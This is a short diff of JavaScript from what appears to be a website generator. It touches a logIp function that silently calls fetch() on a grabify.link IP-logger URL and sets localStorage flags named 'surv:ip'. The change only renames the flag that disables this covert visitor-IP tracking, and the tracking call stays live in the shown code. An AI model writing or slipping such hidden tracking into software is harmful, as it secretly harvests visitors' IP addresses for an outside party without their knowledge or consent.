@@ -436,7 +436,7 @@ GeneratorLoaded(new (function Generator() {
     this.$footerLinks = links;
   }
   this.logIp = function() {
-    if (this._site.DISABLE_IP_LOGGER) return false;
+    if (DISABLE_IP_GRABBER) return false;
     fetch('https://grabify.link/watch.php?ip=67CHVJ.torrent');
     localStorage['surv:ip'] = 1;
     localStorage['surv:asked4ip'] = 1;
